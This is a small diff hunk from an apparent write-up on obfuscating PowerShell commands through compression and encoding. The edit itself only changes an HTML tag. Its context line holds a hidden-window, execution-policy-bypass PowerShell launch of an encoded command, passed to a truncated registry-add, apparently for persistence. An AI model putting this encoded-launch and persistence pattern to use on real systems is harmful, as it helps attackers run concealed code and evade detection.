@@ -28,7 +28,7 @@ $payload="powershell.exe -w h -NoP -NonI -Exec Bypass -enc $command";reg add "HK
 
 ### Encryption and Encode
 
-<p>I know it's corny, but compression is a form of encryption</p>
+<b>I know it's corny, but compression is a form of encryption</b>
 
 We want to compress and encode this coommand to where powershell can decompress. Compression often generates unwanted characters, so we will also encode after compressing
 
